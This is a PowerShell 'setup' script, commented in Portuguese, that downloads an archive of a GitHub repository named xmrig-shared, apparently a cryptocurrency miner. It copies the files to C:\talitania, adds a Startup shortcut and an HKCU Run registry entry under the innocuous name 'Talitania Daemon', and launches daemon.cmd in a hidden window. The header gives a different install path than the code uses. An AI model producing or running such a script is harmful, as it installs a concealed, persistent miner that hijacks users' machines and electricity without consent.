<#
  setup.ps1 — instala e configura assets do repositório em C:\xmrig-shared

  O que faz:
  - baixa o ZIP do branch main do repositório
  - extrai e copia a pasta `assets` para C:\xmrig-shared\assets
  - cria um atalho na pasta Startup do usuário para `assets\daemon.cmd`
  - cria/atualiza uma entrada em HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    para iniciar `assets\daemon.cmd` no login do usuário
  - executa `assets\daemon.cmd` uma vez no final

  Observações:
  - Execute em PowerShell com privilégios de usuário; se arquivos exigir
    drivers/instalação elevadas, execute como Administrador.
  - Repositório: https://github.com/5q0r/xmrig-shared
#>

[CmdletBinding()]
param()

function Write-Info($m) { Write-Host "[INFO] $m" }
function Write-Warn($m) { Write-Warning "[WARN] $m" }

try {
    $RepoUrl = 'https://github.com/5q0r/xmrig-shared'
    $ZipUrl = "$RepoUrl/archive/refs/heads/main.zip"
    $TempZip = Join-Path $env:TEMP 'xmrig-shared.zip'
    $TempExtract = Join-Path $env:TEMP 'xmrig-shared-extract'
    $Destino = 'C:\talitania'
    $Startup = [Environment]::GetFolderPath('Startup')
    $ShortcutPath = Join-Path $Startup 'talitania.lnk'
    $RunName = 'Talitania Daemon'

    Write-Info "Destino: $Destino"

    if (-not (Test-Path $Destino)) {
        Write-Info 'Criando diretório de destino...'
        New-Item -Path $Destino -ItemType Directory | Out-Null
    }

    Write-Info 'Baixando o repositório (branch main)...'
    Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing -ErrorAction Stop

    if (Test-Path $TempExtract) { Remove-Item -Recurse -Force $TempExtract }
    Expand-Archive -Path $TempZip -DestinationPath $TempExtract -Force
    Remove-Item $TempZip -Force

    $pastaExtraida = Get-ChildItem -Path $TempExtract | Where-Object { $_.PSIsContainer } | Select-Object -First 1
    if (-not $pastaExtraida) { throw 'Não foi possível localizar a pasta extraída do repositório.' }
    $sourcePath = $pastaExtraida.FullName

    # Copiar pasta assets inteira, se existir
    $sourceAssets = Join-Path $sourcePath 'assets'
    if (Test-Path $sourceAssets) {
        $destAssets = Join-Path $Destino 'assets'
        if (Test-Path $destAssets) { Remove-Item -Recurse -Force $destAssets }
        Write-Info "Copiando assets para $destAssets ..."
        Copy-Item -Path $sourceAssets -Destination $Destino -Recurse -Force
    } else {
        Write-Warn 'Pasta assets não encontrada no repositório.'
    }

    # Copiar arquivos úteis (README, LICENSE) se existirem
    foreach ($f in @('README.md','LICENSE')) {
        $s = Join-Path $sourcePath $f
        if (Test-Path $s) { Copy-Item -Path $s -Destination $Destino -Force }
    }

    # Limpeza
    Remove-Item -Recurse -Force $TempExtract

    # Preparar atalho de inicialização e registro Run para daemon
    $daemonPath = Join-Path $Destino 'assets\daemon.cmd'
    if (Test-Path $daemonPath) {
        Write-Info "Criando atalho na pasta Startup: $ShortcutPath"
        $wsh = New-Object -ComObject WScript.Shell
        $shortcut = $wsh.CreateShortcut($ShortcutPath)
        $shortcut.TargetPath = $daemonPath
        $shortcut.WorkingDirectory = Split-Path $daemonPath -Parent
        $shortcut.IconLocation = $daemonPath
        $shortcut.Save()

        Write-Info 'Criando/atualizando entrada HKCU Run para iniciar o daemon no login...'
        $regValue = '"' + $daemonPath + '"'
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RunName -Value $regValue

        Write-Info 'Executando daemon uma vez (background)...'
        Start-Process -FilePath $daemonPath -WindowStyle Hidden
    } else {
        Write-Warn "$daemonPath não encontrado — pular criação de atalho/registro."
    }

    Write-Info 'Setup concluído.'
    exit 0

} catch {
    Write-Error "Erro durante o setup: $_"
    exit 1
}